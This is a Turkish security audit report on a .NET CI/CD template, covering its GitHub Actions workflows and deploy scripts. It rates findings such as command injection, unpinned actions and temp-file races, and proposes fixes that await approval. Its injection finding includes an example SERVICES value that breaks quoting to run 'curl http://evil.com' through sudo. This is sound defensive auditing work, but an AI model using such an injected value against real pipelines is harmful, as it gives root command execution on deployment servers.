# Güvenlik Denetim Raporu — dotnet-cicd-template

**Kapsam:** `SV&V (Software Verification & Validation)` perspektifinden manuel kod incelemesi.  
**Tarih:** 2026-07-08  
**İncelenen dosyalar:** `production-deploy.yml`, `production-rollback.yml`, `continuous-integration.yml`, `reusable-dotnet-build.yml`, `pipeline.sh`, `ssh-remote.sh`, `verify-health.sh`, `build-test/action.yml`  
**Yöntem:** Statik analiz / kod okuma — çalışan ortam testi yapılmamıştır.  
**Not:** Bu rapor yalnızca bulgular içerir; **raporda onay olmadan hiçbir kod değişikliği yapılmayacaktır.**

---

## Özet Puan Tablosu

| ID | Başlık | Önem | Dosya |
|---|---|---|---|
| INJ-01 | `remote_sudo` komut enjeksiyonu (SERVICES alanları) | **ORTA** | `pipeline.sh` |
| PIN-01 | Action sürümlerinde SHA yerine etiket kullanımı | **DÜŞÜK-ORTA** | Tüm workflow'lar |
| FORK-01 | `pull_request` tetikleyicisi + self-hosted runner | **DÜŞÜK** | `continuous-integration.yml` |
| TMP-01 | Uzak geçici dosya yolu tahmin edilebilir (`/tmp/cicd-env-$$`) | **DÜŞÜK** | `pipeline.sh` |
| CLEANUP-01 | SSH anahtar dosyası `SIGKILL`'de temizlenmiyor | **BİLGİ** | `ssh-remote.sh` |

Tespit edilen **yüksek önem** bulgusu yoktur.

---

## Bulgu Detayları

### INJ-01 — `remote_sudo` Komut Enjeksiyonu
**Önem:** ORTA  
**Dosya/Satır:** `pipeline.sh`, `target_backup_one`, `target_publish_dir`, `target_restart_one`, `target_rollback_one`

**Kanıt:**
```bash
# pipeline.sh – target_backup_one (satır ~60)
remote_sudo "if [ -d '$dd' ]; then rm -rf '${dd}.previous'; cp -a '$dd' '${dd}.previous'; fi"

# pipeline.sh – target_restart_one (satır ~119)
remote_sudo "systemctl restart '${svc}'"
```

`$dd` (deploy_dir) ve `$svc` (service_name) değerleri `SERVICES` repo değişkeninden gelir. `remote_sudo` içinde bu değerler tek-tırnak içine yerleştirilir; ancak `$dd` veya `$svc` değeri tek-tırnak (`'`) içeriyorsa bash string'i parçalanır ve enjekte edilen komut `sudo bash -c` ile çalışır.

**Örnek saldırı vektörü:**  
```
SERVICES="web|src/Web.csproj|/opt/myapp'; curl http://evil.com|myapp-web|http://127.0.0.1:5000"
```
Bu değer deploy_dir'e `/opt/myapp'` yerleştirerek `remote_sudo` string'ini kırar.

**Azaltıcı faktörler:**
- `SERVICES` yalnızca repo yöneticileri tarafından ayarlanabilir (GitHub Settings → Variables), dolayısıyla saldırı vektörü **içeriden** veya ele geçirilmiş bir GitHub hesabı gerektirir.
- `printf '%q'` SSH kanalını güvenli hale getirir; sorun bash string'inin kendisindedir.
- Üretim repo'ları genellikle kısıtlı erişimlidir; gerçek dünya riski düşüktür.

**Önerilen düzeltme (onayınızı bekliyor):** `remote_sudo` çağrılarında `$dd` ve `$svc` değerleri `printf '%q'` ile tırnak içine alınmalıdır, veya değerler `ssh ... bash` stdin üzerinden güvenli biçimde geçirilmelidir.

---

### PIN-01 — Action Sürümlerinde SHA Yerine Etiket
**Önem:** DÜŞÜK-ORTA  
**Dosya/Satır:** Tüm workflow'lar

**Kanıt:**
```yaml
uses: actions/checkout@v4
uses: actions/cache@v4
uses: actions/upload-artifact@v4
```

**Sorun:** `@v4` gibi etiketler GitHub tarafından herhangi bir zamanda yeni bir commit'e yönlendirilebilir (tag mutation). Güvenlik standartlarına (SLSA L3, OpenSSF Scorecard) göre commit SHA ile pin'leme önerilir:
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Azaltıcı faktörler:**
- `actions/checkout`, `actions/cache`, `actions/upload-artifact` GitHub'ın resmi action'larıdır; kötü amaçlı değişiklik olasılığı düşüktür.
- Self-hosted runner ortamı, GitHub-hosted runner'a göre zaten kontrollüdür.
- Bu template bir şablon reposudur; kullanıcı reposu bu action'ları kendi workflow'larında çalıştırır — GitHub-hosted runner kullanılıyorsa risk daha anlamlıdır.

**Önerilen düzeltme (onayınızı bekliyor):** Action etiketlerini tam SHA ile değiştirin veya `Dependabot` / `Renovate` ile otomatik güncelleme + SHA pin'leme ekleyin.

---

### FORK-01 — `pull_request` + Self-Hosted Runner
**Önem:** DÜŞÜK  
**Dosya/Satır:** `continuous-integration.yml`, satır 13–14

**Kanıt:**
```yaml
on:
  pull_request:
    branches: [ main ]
```

**Sorun:** Repo herkese açık olursa, fork'tan gelen PR'lar `pull_request` olayını tetikler ve **self-hosted runner üzerinde fork'taki kod çalışır**. Bu, runner'da yerel erişim anlamına gelebilir.

**Azaltıcı faktörler:**
- Template genellikle **private** proje repolarında kullanılır; fork PR senaryosu tipik kullanımda yoktur.
- GitHub, fork PR'lar için self-hosted runner'da gizli değişkenleri maskeler (Secrets fork'a açılmaz).

**Önerilen düzeltme (opsiyonel, onayınızı bekliyor):** Eğer repo herkese açık olacaksa `pull_request_target` yerine `pull_request` kullanımı ve `environment: ci-review` gibi bir approval gate eklenebilir. Private repo için mevcut haliyle kabul edilebilir.

---

### TMP-01 — Uzak Geçici Dosya Yolu (`/tmp/cicd-env-$$`)
**Önem:** DÜŞÜK  
**Dosya/Satır:** `pipeline.sh` – `target_write_env_one`, satır ~87

**Kanıt:**
```bash
local tmp="/tmp/cicd-env-$$"
remote_write_file "$content" "$tmp" 600
remote_sudo "mv '$tmp' '${dd}/.env' && chmod 600 '${dd}/.env' && ..."
```

**Sorun:** `/tmp/cicd-env-<PID>` yolu, PID tahmin edilerek sembolik bağlantı (symlink) saldırısına konu olabilir: hedef sunucuya yerel erişimi olan bir saldırgan dosyadan önce bu yola symlink yerleştirirse rsync farklı bir dosyanın üzerine yazabilir (TOCTOU).

**Azaltıcı faktörler:**
- Saldırı, hedef sunucuda **yerel bir hesap** gerektirir.
- Deploy kullanıcısı dışında bir hesap bu sunucuda bulunuyor olmalıdır.
- Güvenli sunucu ortamlarında pratikte ihmal edilebilir.

**Önerilen düzeltme (opsiyonel, onayınızı bekliyor):** Uzak tarafta da `mktemp` kullanılabilir: `remote_ssh "mktemp"` ile geçici yol alınır, ardından rsync uygulanır.

---

### CLEANUP-01 — SSH Anahtar Dosyası `SIGKILL`'de Temizlenmiyor
**Önem:** BİLGİ  
**Dosya/Satır:** `ssh-remote.sh`, satır 123

**Kanıt:**
```bash
trap ssh_remote_cleanup EXIT
```

**Sorun:** `SIGKILL` sinyali bash `trap` mekanizmasını atlatır. Pipeline süreç `kill -9` ile sonlandırılırsa `$SSH_KEY_FILE` geçici dosyası (`chmod 600`) temizlenmeden kalabilir.

**Azaltıcı faktörler:**
- Dosya `chmod 600` ile korunur; başka kullanıcılar okuyamaz.
- CI runner'ında her job'ın kendi çalışma alanı vardır; job sona erince runner ortamı temizlenir.
- `SIGKILL` ile job sonlandırma GitHub Actions'ta nadirdir.

**Önerilen düzeltme (opsiyonel):** `tmpfs`-tabanlı geçici dizin veya runner job sonrası temizleme scripti; pratik olarak mevcut durum kabul edilebilir.

---

## Olumlu Bulgular (İyi Uygulanan)

| Alan | Kanıt |
|---|---|
| En az yetki (least privilege) | Tüm workflow'larda `permissions: contents: read` (deploy'da ek `actions: read`) |
| Artifact köken doğrulaması (provenance) | `production-deploy.yml`: `headSha == github.sha` kontrolü |
| SSH güvenliği | `StrictHostKeyChecking=yes`, `BatchMode=yes`, `ConnectTimeout=15` |
| SSH anahtar ömrü | Geçici dosya (`mktemp`), `chmod 600`, `trap ... EXIT` temizleme |
| PerSourcePenalties önlemi | `ssh-keyscan` tekrar edilmiyor; `ssh-keygen -F` ile önce kontrol |
| Gizli bilgi sızıntısı yok | Hiçbir `echo` / `cat` komutu secret değerleri loglara yazmıyor |
| Onay kapısı | `environment: production` + required reviewers + prevent self-review |
| Eşzamanlılık kontrolü | `concurrency: group: deploy-${{ github.repository }}, cancel-in-progress: false` |
| Rollback fail-safe | Health check başarısız → otomatik rollback → `exit 1` |
| Validate adımı | Deploy başlangıcında SERVICES, SSH değişkenleri doğrulanıyor |

---

## Sonuç

Şablon genel olarak **güvenli** bir tasarıma sahiptir. Tespit edilen en önemli bulgu `INJ-01`'dir; ancak `SERVICES` değişkenine yalnızca repo yöneticilerinin erişebildiği varsayımıyla pratik riski düşüktür. `PIN-01` ise CI/CD güvenlik standartları açısından belgelenmesi gereken bir iyileştirme fırsatıdır.

**Kod değişikliği yapmak için "şunu düzelt" onayınızı bekliyorum.**
